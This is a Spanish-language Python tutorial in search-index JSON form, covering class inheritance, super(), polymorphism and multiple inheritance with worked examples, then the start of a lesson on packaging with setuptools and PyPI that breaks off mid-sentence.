en la POO En este ejercicio vas a trabajar el concepto de herencia un poco m\u00e1s en profundidad, aprovechando para introducir un nuevo concepto muy importante que te facilitar\u00e1 mucho la vida. Hasta ahora sabemos que una clase heredada puede f\u00e1cilmente extender algunas funcionalidades, simplemente a\u00f1adiendo nuevos atributos y m\u00e9todos, o sobreescribiendo los ya existentes. Como en el siguiente ejemplo class Vehiculo (): def __init__ ( self , color , ruedas ): self . color = color self . ruedas = ruedas def __str__ ( self ): return \"color {} , {} ruedas\" . format ( self . color , self . ruedas ) class Coche ( Vehiculo ): def __init__ ( self , color , ruedas , velocidad , cilindrada ): self . color = color self . ruedas = ruedas self . velocidad = velocidad self . cilindrada = cilindrada def __str__ ( self ): return \"color {} , {} km/h, {} ruedas, {} cc\" . format ( self . color , self . velocidad , self . ruedas , self . cilindrada ) c = Coche ( \"azul\" , 150 , 4 , 1200 ) print ( c ) Color azul, 4 km/h, 150 ruedas, 1200 cc El inconveniente m\u00e1s evidente de ir sobreescribiendo es que tenemos que volver a escribir el c\u00f3digo de la superclase y luego el espec\u00edfico de la subclase. Para evitarnos escribir c\u00f3digo innecesario, podemos utilizar un truco que consiste en llamar el m\u00e9todo de la superclase y luego simplemente escribir el c\u00f3digo de la clase: class Vehiculo (): def __init__ ( self , color , ruedas ): self . color = color self . ruedas = ruedas def __str__ ( self ): return \"color {} , {} ruedas\" . format ( self . color , self . ruedas ) class Coche ( Vehiculo ): def __init__ ( self , color , ruedas , velocidad , cilindrada ): Vehiculo . __init__ ( self , color , ruedas ) self . velocidad = velocidad self . cilindrada = cilindrada def __str__ ( self ): return Vehiculo . __str__ ( self ) + \", {} km/h, {} cc\" . format ( self . velocidad , self . cilindrada ) # utilizamos super() c = Coche ( \"azul\" , 4 , 150 , 1200 ) print ( c ) Color azul, 4 ruedas, 150 km/h, 1200 cc Como tener que determinar constantemente la superclase puede ser fastidioso, Python nos permite utilizar un acceso directo mucho m\u00e1s c\u00f3modo llamada super(). Hacerlo de esta forma adem\u00e1s nos permite llamar c\u00f3modamente los m\u00e9todos o atributos de la superclase sin necesidad de especificar el self. class Vehiculo (): def __init__ ( self , color , ruedas ): self . color = color self . ruedas = ruedas def __str__ ( self ): return \"color {} , {} ruedas\" . format ( self . color , self . ruedas ) class Coche ( Vehiculo ): def __init__ ( self , color , ruedas , velocidad , cilindrada ): super () . __init__ ( color , ruedas ) # utilizamos super() sin self en lugar de Vehiculo self . velocidad = velocidad self . cilindrada = cilindrada def __str__ ( self ): return super () . __str__ () + \", {} km/h, {} cc\" . format ( self . velocidad , self . cilindrada ) c = Coche ( \"azul\" , 4 , 150 , 1200 ) print ( c ) Veh\u00edculo azul, 4 ruedas, 150 km/h, 1200 cc Ejercicio Utilizando esta nueva t\u00e9cnica, extiende la clase Vehiculo y realiza la siguiente implementaci\u00f3n: Experimenta Crea al menos un objeto de cada subclase y a\u00f1\u00e1delos a una lista llamada vehiculos. Realiza una funci\u00f3n llamada catalogar() que reciba la lista de vehiculos y los recorra mostrando el nombre de su clase y sus atributos. Modifica la funci\u00f3n catalogar() para que reciba un argumento optativo ruedas , haciendo que muestre \u00fanicamente los que su n\u00famero de ruedas concuerde con el valor del argumento. Tambi\u00e9n debe mostrar un mensaje \"Se han encontrado {} veh\u00edculos con {} ruedas:\" \u00fanicamente si se env\u00eda el argumento ruedas. Ponla a prueba con 0, 2 y 4 ruedas como valor. Recordatorio: Puedes utilizar el atributo especial de clase name de la siguiente forma para recuperar el nombre de la clase de un objeto: type ( objeto ) . __name__ class Vehiculo (): def __init__ ( self , color , ruedas ): self . color = color self . ruedas = ruedas def __str__ ( self ): return \"color {} , {} ruedas\" . format ( self . color , self . ruedas ) class Coche ( Vehiculo ): def __init__ ( self , color , ruedas , velocidad , cilindrada ): super () . __init__ ( color , ruedas ) # utilizamos super() sin self en lugar de Vehiculo self . velocidad = velocidad self . cilindrada = cilindrada def __str__ ( self ): return super () . __str__ () + \", {} km/h, {} cc\" . format ( self . velocidad , self . cilindrada ) # Completa el ejercicio aqu\u00ed class Camioneta ( Coche ): def __init__ ( self , color , ruedas , velocidad , cilindrada , carga ): super () . __init__ ( color , ruedas , velocidad , cilindrada ) self . carga = carga def __str__ ( self ): return super () . __str__ () + \", {} kg de carga\" . format ( self . carga ) class Bicicleta ( Vehiculo ): def __init__ ( self , color , ruedas , tipo ): super () . __init__ ( color , ruedas ) self . tipo = tipo def __str__ ( self ): return super () . __str__ () + \", {} \" . format ( self . tipo ) class Motocicleta ( Bicicleta ): def __init__ ( self , color , ruedas , tipo , velocidad , cilindrada ): super () . __init__ ( color , ruedas , tipo ) self . velocidad = velocidad self . cilindrada = cilindrada def __str__ ( self ): return super () . __str__ () + \", {} km/h, {} cc\" . format ( self . velocidad , self . cilindrada ) def catalogar ( vehiculos ): for v in vehiculos : print ( type ( v ) . __name__ , v ) def catalogar ( vehiculos , ruedas = None ): # Primera pasada, mostrar recuento if ruedas != None : contador = 0 for v in vehiculos : if v . ruedas == ruedas : contador += 1 print ( \" \\n Se han encontrado {} veh\u00edculos con {} ruedas:\" . format ( contador , ruedas )) # Segnda pasada, mostrar veh\u00edculos for v in vehiculos : if ruedas == None : print ( type ( v ) . __name__ , v ) else : if v . ruedas == ruedas : print ( type ( v ) . __name__ , v ) lista = [ Coche ( \"azul\" , 4 , 150 , 1200 ), Camioneta ( \"blanco\" , 4 , 100 , 1300 , 1500 ), Bicicleta ( \"verde\" , 2 , \"urbana\" ), Motocicleta ( \"negro\" , 2 , \"deportiva\" , 180 , 900 ) ] catalogar ( lista ) catalogar ( lista , 0 ) catalogar ( lista , 2 ) catalogar ( lista , 4 ) Coche color azul, 4 ruedas, 150 km/h, 1200 cc Camioneta color blanco, 4 ruedas, 100 km/h, 1300 cc, 1500 kg de carga Bicicleta color verde, 2 ruedas, urbana Motocicleta color negro, 2 ruedas, deportiva, 180 km/h, 900 cc Se han encontrado 0 veh\u00edculos con 0 ruedas: Se han encontrado 2 veh\u00edculos con 2 ruedas: Bicicleta color verde, 2 ruedas, urbana Motocicleta color negro, 2 ruedas, deportiva, 180 km/h, 900 cc Se han encontrado 2 veh\u00edculos con 4 ruedas: Coche color azul, 4 ruedas, 150 km/h, 1200 cc Camioneta color blanco, 4 ruedas, 100 km/h, 1300 cc, 1500 kg de carga","title":"Herencias"},{"location":"lenguajes/python3/apuntes-Herencia/#herencias","text":"","title":"Herencias"},{"location":"lenguajes/python3/apuntes-Herencia/#estructura-para-los-productos-de-una-tienda","text":"","title":"Estructura para los productos de una tienda"},{"location":"lenguajes/python3/apuntes-Herencia/#ejemplo-sin-herencia","text":"class Producto : def __init__ ( self , referencia , tipo , nombre , pvp , descripcion , productor = None , distribuidor = None , isbn = None , autor = None ): self . referencia = referencia self . tipo = tipo self . nombre = nombre self . pvp = pvp self . descripcion = descripcion self . productor = productor self . distribuidor = distribuidor self . isbn = isbn self . autor = autor adorno = Producto ( '000A' , 'ADORNO' , 'Vaso Adornado' , 15 , 'Vaso de porcelana con dibujos' ) print ( adorno ) <__main__.Producto at 0x5243810> adorno . tipo 'ADORNO'","title":"Ejemplo sin herencia"},{"location":"lenguajes/python3/apuntes-Herencia/#creando-una-jerarquia-de-productos-con-clases","text":"","title":"Creando una jerarqu\u00eda de productos con clases"},{"location":"lenguajes/python3/apuntes-Herencia/#superclase-producto","text":"class Producto : def __init__ ( self , referencia , nombre , pvp , descripcion ): self . referencia = referencia self . nombre = nombre self . pvp = pvp self . descripcion = descripcion def __str__ ( self ): return \"\"\" \\ REFERENCIA \\t {} NOMBRE \\t\\t {} PVP \\t\\t {} DESCRIPCI\u00d3N \\t {} \"\"\" . format ( self . referencia , self . nombre , self . pvp , self . descripcion )","title":"Superclase Producto"},{"location":"lenguajes/python3/apuntes-Herencia/#subclase-adorno","text":"class Adorno ( Producto ): pass a = Adorno ( 2034 , \"Vaso adornado\" , 15 , \"Vaso de porcelana adornado con \u00e1rboles\" ) print ( a ) Referencias 2034 Nombre Vaso adornado PVP 15 Descripcion Vaso de porcelana adornado con \u00e1rboles","title":"Subclase Adorno"},{"location":"lenguajes/python3/apuntes-Herencia/#subclase-alimento","text":"class Alimento ( Producto ): productor = \"\" distribuidor = \"\" def __str__ ( self ): return \"\"\" \\ REFERENCIA \\t {} NOMBRE \\t\\t {} PVP \\t\\t {} DESCRIPCI\u00d3N \\t {} PRODUCTOR \\t {} DISTRIBUIDOR \\t {} \"\"\" . format ( self . referencia , self . nombre , self . pvp , self . descripcion , self . productor , self . distribuidor ) al = Alimento ( 2035 , \"Botella de Aceite de Oliva Extra\" , 5 , \"250 ML\" ) al . productor = \"La Aceitera\" al . distribuidor = \"Distribuciones SA\" print ( al ) REFERENCIA 2035 NOMBRE Botella de Aceite de Oliva Extra PVP 5 DESCRIPCI\u00d3N 250 ML PRODUCTOR La Aceitera DISTRIBUIDOR Distribuciones SA","title":"Subclase Alimento"},{"location":"lenguajes/python3/apuntes-Herencia/#subclase-libro","text":"class Libro ( Producto ): isbn = \"\" autor = \"\" def __str__ ( self ): return \"\"\" \\ REFERENCIA \\t {} NOMBRE \\t\\t {} PVP \\t\\t {} DESCRIPCI\u00d3N \\t {} ISBN \\t\\t {} AUTOR \\t\\t {} \"\"\" . format ( self . referencia , self . nombre , self . pvp , self . descripcion , self . isbn , self . autor ) li = Libro ( 2036 , \"Cocina Mediterr\u00e1nea\" , 9 , \"Recetas sanas y buenas\" ) li . isbn = \"0-123456-78-9\" li . autor = \"Do\u00f1a Juana\" print ( li ) REFERENCIA 2036 NOMBRE Cocina Mediterr\u00e1nea PVP 9 DESCRIPCI\u00d3N Recetas sanas y buenas ISBN 0-123456-78-9 AUTOR Do\u00f1a Juana","title":"Subclase Libro"},{"location":"lenguajes/python3/apuntes-Herencia/#trabajando-con-clases-heredadas-en-conjunto","text":"class Producto : def __init__ ( self , referencia , nombre , pvp , descripcion ): self . referencia = referencia self . nombre = nombre self . pvp = pvp self . descripcion = descripcion def __str__ ( self ): return \"\"\" \\ REFERENCIA \\t {} NOMBRE \\t\\t {} PVP \\t\\t {} DESCRIPCI\u00d3N \\t {} \"\"\" . format ( self . referencia , self . nombre , self . pvp , self . descripcion ) class Adorno ( Producto ): pass class Alimento ( Producto ): productor = \"\" distribuidor = \"\" def __str__ ( self ): return super () . __str__ () + \"\"\" \\ PRODUCTOR \\t {} DISTRIBUIDOR \\t {} \"\"\" . format ( self . productor , self . distribuidor ) class Libro ( Producto ): isbn = \"\" autor = \"\" def __str__ ( self ): return super () . __str__ () + \"\"\" \\ ISBN \\t\\t {} AUTOR \\t\\t {} \"\"\" . format ( self . isbn , self . autor )","title":"Trabajando con clases heredadas en conjunto"},{"location":"lenguajes/python3/apuntes-Herencia/#creamos-algunos-objetos","text":"ad = Adorno ( 2034 , \"Vaso adornado\" , 15 , \"Vaso de porcelana adornado con \u00e1rboles\" ) al = Alimento ( 2035 , \"Botella de Aceite de Oliva Extra\" , 5 , \"250 ML\" ) al . productor = \"La Aceitera\" al . distribuidor = \"Distribuciones SA\" li = Libro ( 2036 , \"Cocina Mediterr\u00e1nea\" , 9 , \"Recetas sanas y buenas\" ) li . isbn = \"0-123456-78-9\" li . autor = \"Do\u00f1a Juana\"","title":"Creamos algunos objetos"},{"location":"lenguajes/python3/apuntes-Herencia/#lista-de-productos","text":"productos = [ ad , al ] productos . append ( li ) print ( productos ) [<__main__.Adorno at 0x14c58660940>, <__main__.Alimento at 0x14c586608d0>, <__main__.Libro at 0x14c58660978>]","title":"Lista de productos"},{"location":"lenguajes/python3/apuntes-Herencia/#lectura-secuencial-de-productos-con-un-for-in","text":"for p in productos : print ( p , \" \\n \" ) REFERENCIA 2034 NOMBRE Vaso adornado PVP 15 DESCRIPCI\u00d3N Vaso de porcelana adornado con \u00e1rboles REFERENCIA 2035 NOMBRE Botella de Aceite de Oliva Extra PVP 5 DESCRIPCI\u00d3N 250 ML PRODUCTOR La Aceitera DISTRIBUIDOR Distribuciones SA REFERENCIA 2036 NOMBRE Cocina Mediterr\u00e1nea PVP 9 DESCRIPCI\u00d3N Recetas sanas y buenas ISBN 0-123456-78-9 AUTOR Do\u00f1a Juana","title":"Lectura secuencial de productos con un for .. in"},{"location":"lenguajes/python3/apuntes-Herencia/#podemos-acceder-a-los-atributos-si-son-compartidos-entre-todos-los-objetos","text":"for p in productos : print ( p . referencia , p . nombre ) 2034 Vaso adornado 2035 Botella de Aceite de Oliva Extra 2036 Cocina Mediterr\u00e1nea","title":"Podemos acceder a los atributos si son compartidos entre todos los objetos"},{"location":"lenguajes/python3/apuntes-Herencia/#pero-si-un-objeto-no-tiene-el-atributo-deseado-dara-error","text":"for p in productos : print ( p . autor ) --------------------------------------------------------------------------- AttributeError Traceback (most recent call last) <ipython-input-8-36e9baf5c1cc> in <module>() 1 for p in productos: ----> 2 print(p.autor) AttributeError: 'Adorno' object has no attribute 'autor'","title":"Pero si un objeto no tiene el atributo deseado, dar\u00e1 error:"},{"location":"lenguajes/python3/apuntes-Herencia/#tendremos-que-tratar-cada-subclase-de-forma-distinta-gracias-a-la-funcion-isistance","text":"for p in productos : if ( isinstance ( p , Adorno ) ): print ( p . referencia , p . nombre ) elif ( isinstance ( p , Alimento ) ): print ( p . referencia , p . nombre , p . productor ) elif ( isinstance ( p , Libro ) ): print ( p . referencia , p . nombre , p . isbn ) 2034 Vaso adornado 2035 Botella de Aceite de Oliva Extra La Aceitera 2036 Cocina Mediterr\u00e1nea 0-123456-78-9","title":"Tendremos que tratar cada subclase de forma distinta, gracias a la funci\u00f3n isistance():"},{"location":"lenguajes/python3/apuntes-Herencia/#funciones-que-reciben-objetos-de-distintas-clases","text":"","title":"Funciones que reciben objetos de distintas clases"},{"location":"lenguajes/python3/apuntes-Herencia/#los-obetos-se-envian-por-referencia-a-las-funciones","text":"As\u00ed que debemos tener en cuenta que cualquier cambio realizado dentro afectar\u00e1 al propio objeto. def rebajar_producto ( p , rebaja ): \"\"\"Rebaja un producto en porcentaje de su precio\"\"\" p . pvp = p . pvp - ( p . pvp / 100 * rebaja ) rebajar_producto ( al , 10 ) print ( al_rebajado ) REFERENCIA 2038 NOMBRE Botella de Aceite de Oliva Extra PVP 4.5 DESCRIPCI\u00d3N 250 ML PRODUCTOR La Aceitera DISTRIBUIDOR Distribuciones SA print ( al ) REFERENCIA 2035 NOMBRE Botella de Aceite de Oliva Extra PVP 4.5 DESCRIPCI\u00d3N 250 ML PRODUCTOR La Aceitera DISTRIBUIDOR Distribuciones SA","title":"Los obetos se env\u00edan por referencia a las funciones"},{"location":"lenguajes/python3/apuntes-Herencia/#una-copia-de-un-objeto-tambien-hace-referencia-al-objeto-copiado-como-un-acceso-directo","text":"copia_al = al copia_al . referencia = 2038 print ( copia_al ) REFERENCIA 2038 NOMBRE Botella de Aceite de Oliva Extra PVP 4.5 DESCRIPCI\u00d3N 250 ML PRODUCTOR La Aceitera DISTRIBUIDOR Distribuciones SA print ( al ) REFERENCIA 2038 NOMBRE Botella de Aceite de Oliva Extra PVP 4.5 DESCRIPCI\u00d3N 250 ML PRODUCTOR La Aceitera DISTRIBUIDOR Distribuciones SA","title":"Una copia de un objeto tambi\u00e9n hace referencia al objeto copiado (como un acceso directo)"},{"location":"lenguajes/python3/apuntes-Herencia/#esto-tambien-sucede-con-los-tipos-compuestos","text":"l = [ 1 , 2 , 3 ] l2 = l [:] l2 . append ( 4 ) l [1, 2, 3, 4]","title":"Esto tambi\u00e9n sucede con los tipos compuestos:"},{"location":"lenguajes/python3/apuntes-Herencia/#para-crear-una-copia-100-nueva-debemos-utilizar-el-modulo-copy","text":"import copy copia_ad = copy . copy ( ad ) print ( copia_ad ) REFERENCIA 2034 NOMBRE Vaso adornado PVP 15 DESCRIPCI\u00d3N Vaso de porcelana adornado con \u00e1rboles copia_ad . pvp = 25 print ( copia_ad ) REFERENCIA 2034 NOMBRE Vaso adornado PVP 25 DESCRIPCI\u00d3N Vaso de porcelana adornado con \u00e1rboles print ( ad ) REFERENCIA 2034 NOMBRE Vaso adornado PVP 15 DESCRIPCI\u00d3N Vaso de porcelana adornado con \u00e1rboles","title":"Para crear una copia 100% nueva debemos utilizar el m\u00f3dulo copy:"},{"location":"lenguajes/python3/apuntes-Herencia/#polimorfismo","text":"Se refiere a una propiedad de la herencia por la que objetos de distintas subclases pueden responder a una misma acci\u00f3n. def rebajar_producto ( p , rebaja ): p . pvp = p . pvp - ( p . pvp / 100 * rebaja ) El m\u00e9todo rebajar_producto() es capaz de tomar objetos de distintas subclases y manipular el atributo pvp . La acci\u00f3n de manipular el pvp funcionar\u00e1 siempre que los objetos tengan \u00e9se atributo, pero en el caso de no ser as\u00ed, dar\u00eda error. La polimorfia es impl\u00edcita en Python en todos los objetos, ya que todos son hijos de una superclase com\u00fan llamada Object .","title":"Polimorfismo"},{"location":"lenguajes/python3/apuntes-Herencia/#herencia-multiple","text":"Posibilidad de que una subclase herede de m\u00faltiples superclases. El problema aparece cuando las superclases tienen atributos o m\u00e9todos comunes. En estos casos, Python dar\u00e1 prioridad a las clases m\u00e1s a la izquierda en el momento de la declaraci\u00f3n de la subclase. class A : def __init__ ( self ): print ( \"Soy de clase A\" ) def a ( self ): print ( \"Este m\u00e9todo lo heredo de A\" ) class B : def __init__ ( self ): print ( \"Soy de clase B\" ) def b ( self ): print ( \"Este m\u00e9todo lo heredo de B\" ) class C ( B , A ): def c ( self ): print ( \"Este m\u00e9todo es de C\" ) c = C () Soy de clase B c . a () Este m\u00e9todo lo heredo de A c . b () Este m\u00e9todo lo heredo de B c . c () Este m\u00e9todo es de C","title":"Herencia m\u00faltiple"},{"location":"lenguajes/python3/apuntes-Herencia/#ejercicio-herencia-en-la-poo","text":"En este ejercicio vas a trabajar el concepto de herencia un poco m\u00e1s en profundidad, aprovechando para introducir un nuevo concepto muy importante que te facilitar\u00e1 mucho la vida. Hasta ahora sabemos que una clase heredada puede f\u00e1cilmente extender algunas funcionalidades, simplemente a\u00f1adiendo nuevos atributos y m\u00e9todos, o sobreescribiendo los ya existentes. Como en el siguiente ejemplo class Vehiculo (): def __init__ ( self , color , ruedas ): self . color = color self . ruedas = ruedas def __str__ ( self ): return \"color {} , {} ruedas\" . format ( self . color , self . ruedas ) class Coche ( Vehiculo ): def __init__ ( self , color , ruedas , velocidad , cilindrada ): self . color = color self . ruedas = ruedas self . velocidad = velocidad self . cilindrada = cilindrada def __str__ ( self ): return \"color {} , {} km/h, {} ruedas, {} cc\" . format ( self . color , self . velocidad , self . ruedas , self . cilindrada ) c = Coche ( \"azul\" , 150 , 4 , 1200 ) print ( c ) Color azul, 4 km/h, 150 ruedas, 1200 cc El inconveniente m\u00e1s evidente de ir sobreescribiendo es que tenemos que volver a escribir el c\u00f3digo de la superclase y luego el espec\u00edfico de la subclase. Para evitarnos escribir c\u00f3digo innecesario, podemos utilizar un truco que consiste en llamar el m\u00e9todo de la superclase y luego simplemente escribir el c\u00f3digo de la clase: class Vehiculo (): def __init__ ( self , color , ruedas ): self . color = color self . ruedas = ruedas def __str__ ( self ): return \"color {} , {} ruedas\" . format ( self . color , self . ruedas ) class Coche ( Vehiculo ): def __init__ ( self , color , ruedas , velocidad , cilindrada ): Vehiculo . __init__ ( self , color , ruedas ) self . velocidad = velocidad self . cilindrada = cilindrada def __str__ ( self ): return Vehiculo . __str__ ( self ) + \", {} km/h, {} cc\" . format ( self . velocidad , self . cilindrada ) # utilizamos super() c = Coche ( \"azul\" , 4 , 150 , 1200 ) print ( c ) Color azul, 4 ruedas, 150 km/h, 1200 cc Como tener que determinar constantemente la superclase puede ser fastidioso, Python nos permite utilizar un acceso directo mucho m\u00e1s c\u00f3modo llamada super(). Hacerlo de esta forma adem\u00e1s nos permite llamar c\u00f3modamente los m\u00e9todos o atributos de la superclase sin necesidad de especificar el self. class Vehiculo (): def __init__ ( self , color , ruedas ): self . color = color self . ruedas = ruedas def __str__ ( self ): return \"color {} , {} ruedas\" . format ( self . color , self . ruedas ) class Coche ( Vehiculo ): def __init__ ( self , color , ruedas , velocidad , cilindrada ): super () . __init__ ( color , ruedas ) # utilizamos super() sin self en lugar de Vehiculo self . velocidad = velocidad self . cilindrada = cilindrada def __str__ ( self ): return super () . __str__ () + \", {} km/h, {} cc\" . format ( self . velocidad , self . cilindrada ) c = Coche ( \"azul\" , 4 , 150 , 1200 ) print ( c ) Veh\u00edculo azul, 4 ruedas, 150 km/h, 1200 cc","title":"Ejercicio: Herencia en la POO"},{"location":"lenguajes/python3/apuntes-Herencia/#ejercicio","text":"Utilizando esta nueva t\u00e9cnica, extiende la clase Vehiculo y realiza la siguiente implementaci\u00f3n:","title":"Ejercicio"},{"location":"lenguajes/python3/apuntes-Herencia/#experimenta","text":"Crea al menos un objeto de cada subclase y a\u00f1\u00e1delos a una lista llamada vehiculos. Realiza una funci\u00f3n llamada catalogar() que reciba la lista de vehiculos y los recorra mostrando el nombre de su clase y sus atributos. Modifica la funci\u00f3n catalogar() para que reciba un argumento optativo ruedas , haciendo que muestre \u00fanicamente los que su n\u00famero de ruedas concuerde con el valor del argumento. Tambi\u00e9n debe mostrar un mensaje \"Se han encontrado {} veh\u00edculos con {} ruedas:\" \u00fanicamente si se env\u00eda el argumento ruedas. Ponla a prueba con 0, 2 y 4 ruedas como valor. Recordatorio: Puedes utilizar el atributo especial de clase name de la siguiente forma para recuperar el nombre de la clase de un objeto: type ( objeto ) . __name__ class Vehiculo (): def __init__ ( self , color , ruedas ): self . color = color self . ruedas = ruedas def __str__ ( self ): return \"color {} , {} ruedas\" . format ( self . color , self . ruedas ) class Coche ( Vehiculo ): def __init__ ( self , color , ruedas , velocidad , cilindrada ): super () . __init__ ( color , ruedas ) # utilizamos super() sin self en lugar de Vehiculo self . velocidad = velocidad self . cilindrada = cilindrada def __str__ ( self ): return super () . __str__ () + \", {} km/h, {} cc\" . format ( self . velocidad , self . cilindrada ) # Completa el ejercicio aqu\u00ed class Camioneta ( Coche ): def __init__ ( self , color , ruedas , velocidad , cilindrada , carga ): super () . __init__ ( color , ruedas , velocidad , cilindrada ) self . carga = carga def __str__ ( self ): return super () . __str__ () + \", {} kg de carga\" . format ( self . carga ) class Bicicleta ( Vehiculo ): def __init__ ( self , color , ruedas , tipo ): super () . __init__ ( color , ruedas ) self . tipo = tipo def __str__ ( self ): return super () . __str__ () + \", {} \" . format ( self . tipo ) class Motocicleta ( Bicicleta ): def __init__ ( self , color , ruedas , tipo , velocidad , cilindrada ): super () . __init__ ( color , ruedas , tipo ) self . velocidad = velocidad self . cilindrada = cilindrada def __str__ ( self ): return super () . __str__ () + \", {} km/h, {} cc\" . format ( self . velocidad , self . cilindrada ) def catalogar ( vehiculos ): for v in vehiculos : print ( type ( v ) . __name__ , v ) def catalogar ( vehiculos , ruedas = None ): # Primera pasada, mostrar recuento if ruedas != None : contador = 0 for v in vehiculos : if v . ruedas == ruedas : contador += 1 print ( \" \\n Se han encontrado {} veh\u00edculos con {} ruedas:\" . format ( contador , ruedas )) # Segnda pasada, mostrar veh\u00edculos for v in vehiculos : if ruedas == None : print ( type ( v ) . __name__ , v ) else : if v . ruedas == ruedas : print ( type ( v ) . __name__ , v ) lista = [ Coche ( \"azul\" , 4 , 150 , 1200 ), Camioneta ( \"blanco\" , 4 , 100 , 1300 , 1500 ), Bicicleta ( \"verde\" , 2 , \"urbana\" ), Motocicleta ( \"negro\" , 2 , \"deportiva\" , 180 , 900 ) ] catalogar ( lista ) catalogar ( lista , 0 ) catalogar ( lista , 2 ) catalogar ( lista , 4 ) Coche color azul, 4 ruedas, 150 km/h, 1200 cc Camioneta color blanco, 4 ruedas, 100 km/h, 1300 cc, 1500 kg de carga Bicicleta color verde, 2 ruedas, urbana Motocicleta color negro, 2 ruedas, deportiva, 180 km/h, 900 cc Se han encontrado 0 veh\u00edculos con 0 ruedas: Se han encontrado 2 veh\u00edculos con 2 ruedas: Bicicleta color verde, 2 ruedas, urbana Motocicleta color negro, 2 ruedas, deportiva, 180 km/h, 900 cc Se han encontrado 2 veh\u00edculos con 4 ruedas: Coche color azul, 4 ruedas, 150 km/h, 1200 cc Camioneta color blanco, 4 ruedas, 100 km/h, 1300 cc, 1500 kg de carga","title":"Experimenta"},{"location":"lenguajes/python3/apuntes-distribucion/","text":"Distribuci\u00f3n Setuptools En Python todo el tema de empaquetar puede ser un poco lioso, ya que encontramos varios m\u00f3dulos desintados a ello. Nosotros vamos a centrarnos en setuptools , ya que es la forma m\u00e1s utilizada, nos proporciona todo lo necesario para distribuir nuestros propios m\u00f3dulos e incluso nos permite publicar paquetes en el respositorio p\u00fablico PyPI (Python Package Index) de forma directa desde la propia terminal. Si lo record\u00e1is, en la lecci\u00f3n de m\u00f3dulos ya os ense\u00f1\u00e9 como crear un distribuible con setuptools, a lo largo de esta lecci\u00f3n vamos a repasar y aprender varios conceptos nuevos. Paquete b\u00e1sico Antes de comenzar es importante repasar la estructura de un paquete en Python,ya que para distribuir nuestro c\u00f3digo es indispensable estructurarlo dentro de un paquete: | setup.py # Fichero que contiene toda la informaci\u00f3n de instalaci\u00f3n + prueba/ # Directorio del paquete al mismo nivel que setup.py | __init__.py # Fichero que indica que el directorio es un paquete | modulo.py # M\u00f3dulo o script que contiene definiciones Por lo tanto vamos a empaquetar el paquete de nombre prueba , que contiene c\u00f3digo en el fichero modulo.py . Vamos a aprender un poco m\u00e1s sobre el fichero de instalaci\u00f3n. setup.py El fichero de configuraci\u00f3n incluye toda la informaci\u00f3n necesaria para realizar la instalaci\u00f3n de nuestro paquete. Algunos campos incluyen s\u00f3lo metadatos como el nombre, la versi\u00f3n, la descripci\u00f3n o el autor. Pero otros sirven para extender la instalaci\u00f3n. Como ser\u00eda un caos que cada desarrollador pusiera los campos que quisiera, hay una serie de par\u00e1metros comunes y avanzados, pero como son muchos lo m\u00e1s com\u00fan es utilizar una plantilla base como la siguiente que pasa la configuraci\u00f3n a la funci\u00f3n setup : from setuptools import setup setup ( name = \"Prueba\" , # Nombre version = \"0.1\" , # Versi\u00f3n de desarrollo description = \"Paquete de prueba\" , # Descripci\u00f3n del funcionamiento author = \"Hector Costa\" , # Nombre del autor author_email = 'me@hcosta.info' , # Email del autor license = \"GPL\" , # Licencia: MIT, GPL, GPL 2.0... url = \"http://ejemplo.com\" , # P\u00e1gina oficial (si la hay) packages = [ 'prueba' ], ) \u00bfHasta aqu\u00ed f\u00e1cil no? Son simples metadatos para definir el paquete, con la excepci\u00f3n de packages , en el que tenemos que indicar todos los paquetes que formar\u00e1n parte del paquete distribuido en forma de lista. Aunque en este caso \u00fanicamente tendr\u00edamos al paquete prueba , imaginaros que tenemos docenas de subpaquetes y tubi\u00e9ramos que a\u00f1adirlos uno a uno... Pues para estos casos podemos importar una funci\u00f3n que se encargar\u00e1 de buscar autom\u00e1ticamente los subpaquetes, se trata de find_packages y la podemos encontrar dentro de setuptools : from setuptools import setup , find_packages setup ( ... packages = find_packages () ) Dependencias Ahora imaginaros que en vuestro paquete alg\u00fan c\u00f3digo utiliza funciones de un m\u00f3dulo externo o paquete que hay que instalar manualmente. Esto se conoce como dependencias del paquete, y por suerte podemos indicar a un par\u00e1metro que descargue todos los paquetes en la versi\u00f3n que nosotros indiquemos, se trata de install_requires . Por ejemplo imaginad que dentro de nuestro paquete necesitamos utilizar el m\u00f3dulo Pillow para manejar im\u00e1genes. Por regla general podemos instalarlo desde la terminal con el comando: pip install pillow Pero si queremos que el paquete lo instale autom\u00e1ticamente s\u00f3lo tenemos que indicarlo de esta forma: setup ( ... , install_requires = [ \"pillow\" ], ) Y as\u00ed ir\u00edamos poniendo todas las dependencias en la lista. Lo bueno que tiene es que podemos indicar la versi\u00f3n exacta que queremos instalar, por ejemplo. Si mi programa utilizase la versi\u00f3n 1.1.0 de Pillow tendr\u00eda que poner: setup ( ... , install_requires = [ \"pillow==1.1.0\" ], ) En cambio si fuera compatible con cualquier versi\u00f3n a partir de la 1.1.5 podr\u00eda poner: setup ( ... , install_requires = [ \"pillow>=1.1.5\" ], ) Si no indicamos una versi\u00f3n, se instalar\u00e1 autom\u00e1ticamente la m\u00e1s actual. Utilizando un fichero de dependencias De forma similar a antes, quiz\u00e1 llega el momento donde tenemos much\u00edsimas dependencias y es un engorro tener que cambiar directamente el fichero setup.py . Para solucionarlo podemos utilizar una t\u00e9cnica que se basa en crear un fichero de texto y escribir las dependencias, una por l\u00ednea. Luego podemos abrir el fichero y a\u00f1adir las dependencias autom\u00e1ticamente en forma de lista. Generalmente a este fichero se le llama requirements.txt y debe estar en el mismo directorio que setup.py : requirements.txt pillow==1.1.0 django>=1.10.0,<=1.10.3 pygame Luego en las dependencias indicar\u00edamos lo siguiente: setup ( ... , install_requires = [ i . strip () for i in open ( \"requirements.txt\" ) . readlines ()], ) Suite Test Otra cosa interesante que podemos hacer es adjuntar una suite de tests unitarios para nuestro paquete, ya sab\u00e9is, los que aprendimos en la unidad anterior. Para incluirlos tendremos indicar un par\u00e1metro en el instalador llamado test_suite , al que le pasaremos el nombre del directorio que los contiene, por lo general llamado tests : | setup.py | requeriments.txt + prueba/ | __init__.py | modulo.py + tests/ | test_pillow.py | test_django.py | test_pygame.py En el setup.py : setup ( ... , test_suite = \"tests\" ) Luego para ejecutarlos podemos utilizar el comando: python setup . py test PyPI y PIP Por \u00faltimo hablemos un poco m\u00e1s del Python Package Index . Como ya sab\u00e9is se trata de un repositorio p\u00fablico con miles y miles de paquetes creados por la enorme comunidad de Python. De hecho yo mismo cre\u00e9 hace a\u00f1os un peque\u00f1o m\u00f3dulo para el framework django, os dejo el enlace por si os pica la curiosidad: https://pypi.python.org/pypi/django-easyregistration Sea como sea, la forma de instalar c\u00f3modamente los paquetes de PyPI es con la herramienta PIP (un acr\u00f3nimo recursivo de Pip 